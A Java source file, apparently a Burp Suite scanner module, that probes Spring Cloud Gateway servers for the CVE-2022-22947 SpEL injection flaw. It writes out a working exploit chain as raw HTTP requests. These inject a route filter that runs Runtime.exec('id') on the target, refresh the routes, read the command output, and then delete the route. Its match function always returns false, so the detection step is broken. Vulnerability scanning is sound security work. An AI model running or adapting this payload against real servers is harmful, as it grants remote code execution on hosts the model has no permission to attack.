package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.active.feature.RunOnceOnlySuccess;
import burp.scan.lib.Confidence;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtRequest;
import burp.scan.lib.web.utils.GtResponse;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;

public class SpringCloudGateWaySpel implements ModuleBase, RunOnceOnlySuccess {
    static String SpELPayload = "POST /actuator/gateway/routes/hacktest HTTP/1.1\r\n" +
            "Host: %s\r\n" +
            "Accept-Encoding: gzip, deflate\r\n" +
            "Accept: */*\r\n" +
            "Accept-Language: en\r\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n" +
            "Connection: close\r\n" +
            "Content-Type: application/json\r\n" +
            "Content-Length: 329\r\n" +
            "\r\n" +
            "{\n" +
            "  \"id\": \"hacktest\",\n" +
            "  \"filters\": [{\n" +
            "    \"name\": \"AddResponseHeader\",\n" +
            "    \"args\": {\n" +
            "      \"name\": \"Result\",\n" +
            "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"\n" +
            "    }\n" +
            "  }],\n" +
            "  \"uri\": \"http://example.com\"\n" +
            "}";

    static String routePayload = "POST /actuator/gateway/refresh HTTP/1.1\r\n" +
            "Host: %s\r\n" +
            "Accept-Encoding: gzip, deflate\r\n" +
            "Accept: */*\r\n" +
            "Accept-Language: en\r\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n" +
            "Connection: close\r\n" +
            "Content-Type: application/x-www-form-urlencoded\r\n" +
            "Content-Length: 0";

    static String resultPayload = "GET /actuator/gateway/routes/hacktest HTTP/1.1\r\n" +
            "Host: %s\r\n" +
            "Accept-Encoding: gzip, deflate\r\n" +
            "Accept: */*\r\n" +
            "Accept-Language: en\r\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n" +
            "Connection: close\r\n" +
            "Content-Type: application/x-www-form-urlencoded\r\n" +
            "Content-Length: 0";

    static String deleteRoutePayload = "DELETE /actuator/gateway/routes/hacktest HTTP/1.1\r\n" +
            "Host: %s\r\n" +
            "Accept-Encoding: gzip, deflate\r\n" +
            "Accept: */*\r\n" +
            "Accept-Language: en\r\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n" +
            "Connection: close";

    static String refleshPayload = "POST /actuator/gateway/refresh HTTP/1.1\r\n" +
            "Host: %s\r\n" +
            "Accept-Encoding: gzip, deflate\r\n" +
            "Accept: */*\r\n" +
            "Accept-Language: en\r\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\r\n" +
            "Connection: close\r\n" +
            "Content-Type: application/x-www-form-urlencoded\r\n" +
            "Content-Length: 0";

    boolean isMatch(byte[] body) {
        return false;
    }
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        GtURL url = new GtURL(webInfo.getUrl());
        boolean isHttps = url.isHttps();
        String payload = String.format(SpELPayload,url.getHost());
        GtSession session = new GtSession();
        GtRequest request = new GtRequest(payload.getBytes(),isHttps);
        try {
            GtResponse response = session.sendRequest(request);
            if (response.getStatudCode() != 201) {
                return;
            }
            payload = String.format(routePayload,url.getHost());
            request = new GtRequest(payload.getBytes(),isHttps);
            response = session.sendRequest(request);
            if (response.getStatudCode() != 200) {
                return ;
            }
            payload = String.format(resultPayload,url.getHost());
            request = new GtRequest(payload.getBytes(),isHttps);
            response = session.sendRequest(request);
            if (isMatch(response.getBody())) {
                IScanIssue issue = new GtScanIssue(
                        webInfo.getHttpRequestResponse().getHttpService(),
                        new GtURL(webInfo.getUrl()).getURL(),
                        webInfo.getHttpRequestResponse(),
                        "Spring cloud gateway spel",
                        "Spring Cloud Gateway provides a library for building an API Gateway on top of Spring WebFlux.\n" +
                                "\n" +
                                "Applications using Spring Cloud Gateway in the version prior to 3.1.0 and 3.0.6, are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.\n" +
                                "\n" +
                                "References:\n" +
                                "\n" +
                                "https://tanzu.vmware.com/security/cve-2022-22947\n" +
                                "https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/",
                        "",
                        Risk.High,
                        Confidence.Certain
                );
                callbacks.addScanIssue(issue);
                webInfo.addIssue(issue);
            }
            payload = String.format(deleteRoutePayload,url.getHost());
            request = new GtRequest(payload.getBytes(),isHttps);
            session.sendRequest(request);
            payload = String.format(refleshPayload,url.getHost());
            request = new GtRequest(payload.getBytes(),isHttps);
            session.sendRequest(request);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Set<String> getTags() {
        Set<String> tags = new HashSet<>();
        tags.add(TagUtils.toStandardName(TagTypes.SpringCloud_Spring));
        return tags;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
